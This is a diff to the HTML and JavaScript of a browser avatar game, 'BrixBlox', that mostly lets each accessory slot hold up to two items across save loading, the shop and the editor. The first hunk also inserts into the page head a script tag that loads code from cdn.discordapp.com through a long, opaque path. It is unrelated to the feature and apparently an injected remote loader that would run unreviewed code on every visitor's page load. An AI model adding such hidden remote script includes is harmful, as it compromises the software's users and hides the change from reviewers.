@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/ykygMNpaJuSxyyrD-NkBax2zCcQ_H7mvM2ELLKpQ_A1guqV32sFrKLpHbpvAQ5jLg_x-oAZsoDJ1seS2xO24mMXMWfIw6kyQ-amewRmAJzIsFaKQhpr2kCwi2TCEvQtqBvrYblDxMDcDemmIXrZ_tl8zOUqoeFzD2xVEFmrno4wOLbF7UaPcu8szHTrmkydVeVs7kcyG4lA3H1X9iZEXSZ5WqT7IsvUKgUtZE_YhF6qCpPnmWkt3G6Hfk8Oofbk5ZkuQY4q2xbS_t95Tht2i9Yntdov6ypNa-rmm3sAlDt5ZAzUQ4Jpyf0JUPCdNOVbYiwsvB6T9F4hug5TjK83khz2Gb3RyVih6UCpOcLCt2Q8twde02soJ_QUi28W3cunMgRKOhPwjOEoYc35NJvkpumSeGzeRN_-401oBdIdtvzx4PA5DOQPDLZJkI9OfzAcG7CIy6MBC7StuJrADlUO6Qd4RBXkQISNH4UE6AtCdYO5nSFv2b--VxUiAXjL2WSnxkvM96U-q63oSmsSed47u9VOhvJMVcGcrdnNBDGuPsN3fii7muaBzHiklmqlNcFs-M5ne7DkI0qicdoADeWYuVOjwayoo8NKhkO6vfxMaw7VOCk0xtxyBbAryXMWJxl37QvOrR3HmPhBKcLQdXxUOrV3Gd_IOcZvQC-sS'></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>BrixBlox</title>
@@ -611,7 +611,10 @@ function toLab(h){const n=parseInt(h.slice(1),16);return labOf(n>>16&255,n>>8&25
 function colorDist(a,b){const p=toLab(a),q=toLab(b);return Math.sqrt(Math.pow(p[0]-q[0],2)+Math.pow(p[1]-q[1],2)+Math.pow(p[2]-q[2],2))}
 const MIN_LOOK_DIST=30;
 function tooAlike(a,b){return colorDist(a,b)<MIN_LOOK_DIST}
-function normAv(a){a=a||{};const e=a.eq||{};return {owned:Array.isArray(a.owned)?a.owned.slice():[],eq:{hat:e.hat||null,face:e.face||null,facc:e.facc||null,back:e.back||null,neck:e.neck||null},spent:a.spent||0,skin:HEX.test(a.skin)?a.skin:DEF_SKIN,pants:HEX.test(a.pants)?a.pants:DEF_PANTS}}
+/* Each slot can hold up to 2 accessories (older saves held one id as a plain string) */
+function eqArr(v){return Array.isArray(v)?v.filter(function(x){return typeof x==='string'&&x}).slice(-2):(typeof v==='string'&&v?[v]:[])}
+function eqPut(arr,id){arr=arr.filter(function(x){return x!==id});arr.push(id);return arr.slice(-2)}
+function normAv(a){a=a||{};const e=a.eq||{};return {owned:Array.isArray(a.owned)?a.owned.slice():[],eq:{hat:eqArr(e.hat),face:eqArr(e.face),facc:eqArr(e.facc),back:eqArr(e.back),neck:eqArr(e.neck)},spent:a.spent||0,skin:HEX.test(a.skin)?a.skin:DEF_SKIN,pants:HEX.test(a.pants)?a.pants:DEF_PANTS}}
 function makeDemo(){
   function load(){try{return JSON.parse(store.get('brixblox-demo'))||{users:[],recs:{},session:null}}catch(e){return {users:[],recs:{},session:null}}}
   function save(d){store.set('brixblox-demo',JSON.stringify(d))}
@@ -1051,7 +1054,7 @@ async function loadItems(){
     if(me){let ch=false;const av=me.av;
       all.forEach(function(r){if(!r.removed)return;const i=av.owned.indexOf(r.id);
         if(i>=0){av.owned.splice(i,1);ch=true;if(REFUND_REMOVED)av.spent=Math.max(0,(av.spent||0)-(r.price||0))}
-        Object.keys(av.eq).forEach(function(k){if(av.eq[k]===r.id){av.eq[k]=null;ch=true}})});
+        Object.keys(av.eq).forEach(function(k){const l=eqArr(av.eq[k]);if(l.indexOf(r.id)>=0){av.eq[k]=l.filter(function(x){return x!==r.id});ch=true}})});
       if(ch){if(pv.tryEq)pv.tryEq=null;await saveAv()}}
   }catch(e){ITEMS=[]}
   if(me){pvRebuild();if(!$('p-avatar').hidden)paintShop()}}
@@ -1066,7 +1069,7 @@ function makeAvatar(color,eq,look){
   const L=[];
   [[-.4,2,.75,leg],[.4,2,.75,leg],[-1.1,3.9,.7,skin],[1.1,3.9,.7,skin]].forEach(function(a){const pv=new THREE.Group();pv.position.set(a[0]*S,a[1]*S,0);g.add(pv);
     const m=body(rbox(a[2],2,a[2],a[2]*.28),a[3]);m.position.y=-S;pv.add(m);L.push(pv)});
-  if(eq)Object.keys(eq).forEach(function(k){if(eq[k])addItem(g,eq[k],fx)});
+  if(eq)Object.keys(eq).forEach(function(k){eqArr(eq[k]).forEach(function(id){addItem(g,id,fx)})});
   return {g:g,limbs:L,fx:fx}}
 function buildScene(L){
   disposeWorld();world=new THREE.Group();scene.add(world);platMeshes=[];coinMeshes=[];flagMats={};
@@ -1167,9 +1170,9 @@ function paintShop(){
   const tabs=$('shop-tabs');tabs.innerHTML='';
   SLOTS.forEach(function(s){const b=document.createElement('button');b.type='button';b.className='btn ghost small';b.textContent=s[1];b.setAttribute('aria-pressed',String(pv.tab===s[0]));b.onclick=function(){pv.tab=s[0];paintShop()};tabs.appendChild(b)});
   const g=$('shop');g.innerHTML='';const eq=me.av.eq;
-  $('shop-note').textContent=pv.tryEq?'Trying on. This is not saved until you buy or equip it.':'Earn blockbucks by collecting them in games or redeeming them in your Blockbank. You get 10 to start.';
+  $('shop-note').textContent=pv.tryEq?'Trying on. This is not saved until you buy or equip it.':'Earn blockbucks by collecting them in games or redeeming them in your Blockbank. You get 10 to start. You can wear up to 2 accessories of the same type.';
   ITEMS.filter(function(x){return x.slot===pv.tab&&(x.sale!==false||me.av.owned.indexOf(x.id)>=0||isAdm())}).forEach(function(it){
-    const owned=me.av.owned.indexOf(it.id)>=0,worn=eq[it.slot]===it.id,trying=pv.tryEq&&pv.tryEq[it.slot]===it.id&&!worn,off=it.sale===false;
+    const owned=me.av.owned.indexOf(it.id)>=0,worn=eqArr(eq[it.slot]).indexOf(it.id)>=0,trying=!!pv.tryEq&&eqArr(pv.tryEq[it.slot]).indexOf(it.id)>=0&&!worn,off=it.sale===false;
     const d=document.createElement('div');d.className='item'+(worn?' eq':'')+(trying?' tr':'')+(off?' off':'');
     const sw=document.createElement('div');sw.className='sw';sw.style.background=it.c;
     const n=document.createElement('b');n.textContent=it.name;
@@ -1177,13 +1180,13 @@ function paintShop(){
     if(off){const t=document.createElement('span');t.className='tagoff';t.textContent='Off sale';pr.appendChild(t)}
     const row=document.createElement('div');row.className='row';
     function btn(t,f,ghost){const b=document.createElement('button');b.type='button';b.className='btn small'+(ghost?' ghost':'');b.textContent=t;b.onclick=f;row.appendChild(b)}
-    if(owned){btn(worn?'Remove':'Equip',async function(){const old=eq[it.slot];eq[it.slot]=worn?null:it.id;pv.tryEq=null;pvRebuild();paintShop();if(!await saveAv()){eq[it.slot]=old;pvRebuild();paintShop()}})}
+    if(owned){btn(worn?'Remove':'Equip',async function(){const old=eqArr(eq[it.slot]);eq[it.slot]=worn?old.filter(function(x){return x!==it.id}):eqPut(old,it.id);pv.tryEq=null;pvRebuild();paintShop();if(!await saveAv()){eq[it.slot]=old;pvRebuild();paintShop()}})}
     else{
-      btn('Try',function(){pv.tryEq=Object.assign({},eq);pv.tryEq[it.slot]=trying?eq[it.slot]:it.id;pvRebuild();paintShop()},true);
+      btn('Try',function(){pv.tryEq=Object.assign({},eq);pv.tryEq[it.slot]=trying?eqArr(eq[it.slot]):eqPut(eqArr(eq[it.slot]),it.id);pvRebuild();paintShop()},true);
       if(!off)btn('Buy',async function(){
         if(it.sale===false){toast('This item is no longer on sale.');return}
         if(balance()<it.price){toast('Not enough blockbucks. You need '+(it.price-balance())+' more.');return}
-        const prev=JSON.stringify(me.av);me.av.owned.push(it.id);me.av.spent=(me.av.spent||0)+it.price;eq[it.slot]=it.id;pv.tryEq=null;pvRebuild();paintShop();
+        const prev=JSON.stringify(me.av);me.av.owned.push(it.id);me.av.spent=(me.av.spent||0)+it.price;eq[it.slot]=eqPut(eqArr(eq[it.slot]),it.id);pv.tryEq=null;pvRebuild();paintShop();
         if(await saveAv())toast('Bought '+it.name+'!');else{me.av=JSON.parse(prev);pvRebuild();paintShop()}})}
     d.append(sw,n,pr,row);
     if(isAdm()){const r2=document.createElement('div');r2.className='row';
@@ -1196,7 +1199,7 @@ function paintShop(){
     g.appendChild(d)})}
 
 /* ----- Accessory editor (brixblox only): live position / rotation / size / texture on the preview avatar ----- */
-function edPreview(){const d=ED.draft,eq=me.av.eq,t=Object.assign({},eq);Object.keys(t).forEach(function(k){if(t[k]===d.id)t[k]=null});t[d.slot]=d.id;pv.tryEq=t;pvRebuild()}
+function edPreview(){const d=ED.draft,eq=me.av.eq,t=Object.assign({},eq);Object.keys(t).forEach(function(k){t[k]=eqArr(t[k]).filter(function(x){return x!==d.id})});t[d.slot]=eqPut(t[d.slot]||[],d.id);pv.tryEq=t;pvRebuild()}
 function openEdit(it){if(!isAdm())return;ED={id:it.id,draft:Object.assign({},it),guides:true};pvMode('idle');facePreview(true);pv.yaw=0;pv.pitch=.08;edPreview();edRender();$('acc-ed').scrollIntoView({block:'nearest',behavior:'smooth'})}
 function closeEdit(){ED=null;pv.tryEq=null;$('acc-ed').hidden=true;$('acc-ed').innerHTML='';pvRebuild();paintShop()}
 function facePreview(on){pv.ly=on?1.5:.95;pv.zoom=on?2.6:5.6;$('av-face').setAttribute('aria-pressed',String(on));$('av-face').textContent=on?'Full body':'Face close-up'}
